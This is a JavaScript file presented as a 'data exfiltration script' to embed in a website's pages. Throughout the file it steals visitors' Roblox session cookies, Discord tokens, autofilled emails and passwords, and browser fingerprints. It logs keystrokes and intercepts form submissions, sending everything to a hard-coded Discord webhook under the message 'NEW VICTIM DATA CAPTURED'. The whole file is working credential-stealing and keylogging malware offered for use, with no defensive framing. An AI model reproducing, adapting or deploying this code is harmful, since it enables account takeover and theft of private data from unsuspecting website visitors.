// ====================================================
// WEBSITE DATA EXFILTRATION SCRIPT - JANUS/TESAVEK v1.0
// ====================================================
// Embed this script in your website's <head> or before </body>
// It will execute on page load and send data to your Discord webhook
// ====================================================

(function() {
    // Discord Webhook URL
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq';
    
    // Data collection object
    const collectedData = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        ipAddress: 'Collecting...',
        robloxCookies: 'Not found',
        savedCredentials: [],
        discordToken: 'Not found'
    };

    // 1. Collect IP address via external service
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            collectedData.ipAddress = data.ip;
        })
        .catch(() => {
            fetch('https://api64.ipify.org?format=json')
                .then(r => r.json())
                .then(d => collectedData.ipAddress = d.ip)
                .catch(() => collectedData.ipAddress = 'Failed to retrieve');
        });

    // 2. Attempt to extract Roblox cookies (.ROBLOSECURITY)
    try {
        const cookies = document.cookie.split(';');
        const robloxCookie = cookies.find(c => c.trim().startsWith('.ROBLOSECURITY='));
        if (robloxCookie) {
            collectedData.robloxCookies = robloxCookie.trim();
        }
        
        // Also check localStorage for Roblox tokens
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.includes('roblox') || key.includes('ROBLOX')) {
                collectedData.robloxCookies += `\nLocalStorage[${key}]: ${localStorage.getItem(key).substring(0, 100)}`;
            }
        }
    } catch (e) {
        collectedData.robloxCookies = `Error: ${e.message}`;
    }

    // 3. Attempt to harvest saved passwords and emails from forms
    try {
        // Check for autofilled form data
        const forms = document.querySelectorAll('form');
        forms.forEach((form, index) => {
            const inputs = form.querySelectorAll('input[type="email"], input[type="text"][name*="mail"], input[type="password"]');
            inputs.forEach(input => {
                if (input.value) {
                    collectedData.savedCredentials.push({
                        formIndex: index,
                        fieldName: input.name || input.placeholder || 'unknown',
                        fieldType: input.type,
                        value: input.value.substring(0, 200) // Truncate for safety
                    });
                }
            });
        });
        
        // Also check for password managers' data
        if (typeof PasswordCredential !== 'undefined') {
            navigator.credentials.get({password: true})
                .then(cred => {
                    if (cred) {
                        collectedData.savedCredentials.push({
                            source: 'PasswordManager',
                            id: cred.id,
                            type: cred.type
                        });
                    }
                })
                .catch(() => {});
        }
    } catch (e) {
        collectedData.savedCredentials.push(`Error harvesting: ${e.message}`);
    }

    // 4. Attempt to find Discord token in localStorage
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            // Look for Discord token patterns
            if (key.toLowerCase().includes('discord') || 
                key.toLowerCase().includes('token') ||
                (value && value.match(/[mn][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/))) {
                collectedData.discordToken = `Found in localStorage[${key}]: ${value.substring(0, 50)}...`;
                break;
            }
        }
        
        // Also check sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            if (value && value.match(/[mn][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/)) {
                collectedData.discordToken = `Found in sessionStorage[${key}]: ${value.substring(0, 50)}...`;
                break;
            }
        }
    } catch (e) {
        collectedData.discordToken = `Error: ${e.message}`;
    }

    // 5. Collect browser fingerprinting data
    collectedData.browserFingerprint = {
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints,
        pdfViewerEnabled: navigator.pdfViewerEnabled,
        doNotTrack: navigator.doNotTrack,
        webdriver: navigator.webdriver
    };

    // 6. Send data to Discord webhook after a delay to ensure collection
    setTimeout(() => {
        const embed = {
            title: "🚨 WEBSITE VISITOR DATA CAPTURED",
            color: 0xff0000,
            fields: [
                {
                    name: "🌐 IP Address & Location",
                    value: `\`${collectedData.ipAddress}\``,
                    inline: true
                },
                {
                    name: "🕒 Timestamp",
                    value: collectedData.timestamp,
                    inline: true
                },
                {
                    name: "🔗 Visited URL",
                    value: collectedData.url.substring(0, 100)
                },
                {
                    name: "💻 User Agent",
                    value: `\`\`\`${collectedData.userAgent.substring(0, 200)}\`\`\``
                },
                {
                    name: "🎮 Roblox Cookies",
                    value: collectedData.robloxCookies.length > 500 ? 
                           `\`\`\`${collectedData.robloxCookies.substring(0, 500)}...\`\`\`` : 
                           `\`\`\`${collectedData.robloxCookies}\`\`\``
                },
                {
                    name: "🔑 Saved Credentials",
                    value: collectedData.savedCredentials.length > 0 ? 
                           `Found ${collectedData.savedCredentials.length} potential credentials` :
                           "No autofilled credentials detected"
                },
                {
                    name: "🤖 Discord Token",
                    value: collectedData.discordToken
                },
                {
                    name: "🖥️ System Info",
                    value: `Platform: ${collectedData.platform}\nScreen: ${collectedData.screenResolution}\nLanguages: ${collectedData.languages}`
                }
            ],
            footer: {
                text: "Tesavek/Janus Data Exfiltration System v1.0"
            }
        };

        // Send to Discord webhook
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `@everyone **NEW VICTIM DATA CAPTURED** from ${collectedData.url}`,
                embeds: [embed]
            })
        }).catch(e => console.error('Webhook failed:', e));
        
        // Optional: Send detailed credentials in a second message if found
        if (collectedData.savedCredentials.length > 0) {
            setTimeout(() => {
                const credentialData = collectedData.savedCredentials.map((cred, idx) => 
                    `[${idx}] ${cred.fieldName} (${cred.fieldType}): ${cred.value}`
                ).join('\n');
                
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `**DETAILED CREDENTIALS:**\n\`\`\`${credentialData.substring(0, 1900)}\`\`\``
                    })
                }).catch(() => {});
            }, 1000);
        }
        
    }, 3000); // Wait 3 seconds to ensure all async data collection completes

    // 7. Additional payload: Keylogger for any input on the page
    document.addEventListener('keydown', (e) => {
        // Only log meaningful keys (not modifiers)
        if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Tab' || e.key === 'Backspace') {
            // Send keystrokes in batches every 30 seconds
            if (!window.keylogBuffer) window.keylogBuffer = '';
            window.keylogBuffer += e.key;
            
            if (!window.keylogTimer) {
                window.keylogTimer = setTimeout(() => {
                    if (window.keylogBuffer.length > 0) {
                        fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                content: `**KEYLOG from ${collectedData.ipAddress || 'unknown'}**: \`\`\`${window.keylogBuffer.substring(0, 1900)}\`\`\``
                            })
                        }).catch(() => {});
                        window.keylogBuffer = '';
                    }
                }, 30000);
            }
        }
    });

    // 8. Form submission interception
    const originalSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {
        const formData = new FormData(this);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value;
        });
        
        // Send form data before submission
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: `**FORM SUBMISSION INTERCEPTED** from ${collectedData.url}\n\`\`\`${JSON.stringify(data, null, 2).substring(0, 1900)}\`\`\``
            })
        }).catch(() => {});
        
        // Call original submit
        originalSubmit.call(this);
    };

    console.log('Tesavek/Janus data collection script loaded successfully');
})();
